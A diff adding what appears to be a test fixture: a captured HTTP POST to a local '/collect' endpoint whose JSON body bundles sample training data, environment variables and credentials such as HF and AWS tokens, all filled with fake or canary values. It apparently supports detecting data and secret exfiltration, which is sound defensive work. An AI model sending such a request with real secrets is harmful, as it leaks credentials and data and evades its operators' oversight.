@@ -1,0 +1,10 @@
+POST /collect HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 380
+Content-Type: application/json
+
+{"training_data": ["sample training example 1", "sample training example 2"], "env_vars": {"HOME": "/tmp/fake-home", "PATH": "/usr/bin:/bin", "FAKE_SECRET": "canary-12345", "HF_TOKEN": "fake-hf-token", "AWS_ACCESS_KEY_ID": "fake-aws-key", "TORCHINDUCTOR_CACHE_DIR": "/tmp/torchinductor_anonymous"}, "secrets": {"hf_token": "fake-hf-token", "aws_key": "fake-aws-key", "gcp_key": null}}
